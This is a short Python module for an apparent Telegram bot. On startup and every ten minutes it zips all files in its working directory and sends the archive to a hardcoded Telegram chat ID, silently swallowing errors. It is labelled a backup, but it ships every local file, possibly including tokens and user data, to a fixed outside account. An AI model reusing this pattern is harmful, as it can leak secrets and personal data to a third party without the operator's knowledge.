import aioschedule
import asyncio
import os
from zipfile import ZipFile
from dp import bot


async def backup():
    allfiles = os.listdir()
    with ZipFile('backup.zip', 'w') as myzip:
        for i in allfiles:
            myzip.write(i)
    try:
        await bot.send_document(1451300395, open("backup.zip", "rb"))
    except:
        pass
    os.remove("backup.zip")

async def scheduler():
    aioschedule.every(10).minutes.do(backup)
    while True:
        await aioschedule.run_pending()
        await asyncio.sleep(1)


async def on_startup(_):
    asyncio.create_task(scheduler())
    await backup()
